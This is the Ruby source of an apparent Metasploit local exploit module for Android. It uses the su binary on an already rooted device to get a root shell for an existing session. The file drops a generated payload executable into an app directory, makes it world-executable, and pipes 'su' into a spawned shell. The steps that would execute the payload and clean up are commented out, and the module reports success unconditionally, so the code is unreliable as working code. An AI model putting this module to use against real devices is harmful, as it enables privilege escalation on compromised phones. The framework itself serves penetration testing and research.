##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/exploit/exe'


class Metasploit4 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
        'Name'          => 'Android Rooted Device Escalation Exploit',
        'Description'   => %q{
          This module abuses an already rooted device to get back a root shell.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'timwr' ],
        'DisclosureDate' => 'Oct 11 2013',
        'Platform'      => %w{ linux },
        'SessionTypes'  => [ 'shell', 'meterpreter' ],
        'Targets'       =>
          [
            [ 'ARM Device', { 'Arch' => ARCH_ARMLE } ]
          ],
        'DefaultOptions' =>
        {
          #"PrependSetresuid" => true,
          #'DisablePayloadHandler' => 'true',
          "WfsDelay" => 2
        },
        'DefaultTarget' => 0,
      }
      ))
    register_options([
        # These are not OptPath becuase it's a *remote* path
        OptString.new("WritableDir", [ true, "A directory where we can write files", "/data/data/com.metasploit.stage/files" ]),
        OptString.new("su",        [ true, "Path to su executable", "/system/xbin/su" ]),
      ], self.class)
  end

  def check
    if file?(datastore["su"])
      return CheckCode::Detected
    end

    return CheckCode::Unknown
  end

  def exploit

    exe_file = "#{datastore['WritableDir']}/#{rand_text_alpha(3 + rand(5))}.elf"
    print_status("Dropping payload to #{exe_file}")
    write_file(exe_file, generate_payload_exe)

    print_status("Setting #{exe_file} as executable")
    cmd_exec("chmod 777 #{exe_file}")

    begin
      output = cmd_exec("id")
      print_status("id output: \n #{output}")
      print_status("Running su...")
      #output = session.shell_command("#{datastore["su"]}")
      #output = cmd_exec("su")
      #print_status("output:\n#{output}")
      process = session.sys.process.execute("sh", "", {'Channelized' => true})
      print_status("process executed")
      process.channel.write("su")
      print_status("write executed")
      begin
        output = process.channel.read
      rescue Rex::TimeoutError
        print_status("timeout error")
        output = process.channel.read
      end
      print_status("read executed")
      print_status("worked")
      #session.shell_command("#{exe_file}")
      #cmd_exec("/system/bin/sh -c #{exe_file}")
    ensure
      #cmd_exec("rm -f #{exe_file}")
    end
  end

end

